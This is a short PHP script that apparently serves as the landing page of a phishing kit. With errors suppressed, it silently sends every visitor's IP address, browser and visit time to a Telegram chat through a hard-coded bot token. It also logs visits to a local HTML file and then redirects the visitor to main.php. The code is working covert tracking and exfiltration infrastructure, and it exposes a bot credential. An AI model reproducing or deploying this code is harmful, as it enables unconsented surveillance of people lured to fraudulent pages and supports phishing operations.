<?php
error_reporting(0);
set_time_limit(0);
error_log(0);
session_start();
date_default_timezone_set('Asia/Manila');
$dateHis = date('g:i:sa');
$date = date("F j, Y");

$chat_id = "-711719691";
$telebot = "5100874999:AAGYKPDH7OhtbYM0NXbA2soy3pNXImKluM8";

$data = [
'chat_id' => $chat_id,
'text' => "Visitors IP: " . $_SERVER['REMOTE_ADDR'] . "\nBrowser: " . $_SERVER['HTTP_USER_AGENT'] . "\nTime: " .$dateHis. "\nDate: " .$date
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));
$fp = fopen("./visit.html", "a");
			fputs($fp, "<h4>&#10050; VISITORS IP : ". $_SERVER['REMOTE_ADDR'] ." &#10050; <br> &#128337; ".$dateHis." &#128337;<br> &#128337; ".$date." &#128337;</h4>
      			
      \n");
header('location: ./main.php');
die();
exit(); 
?>
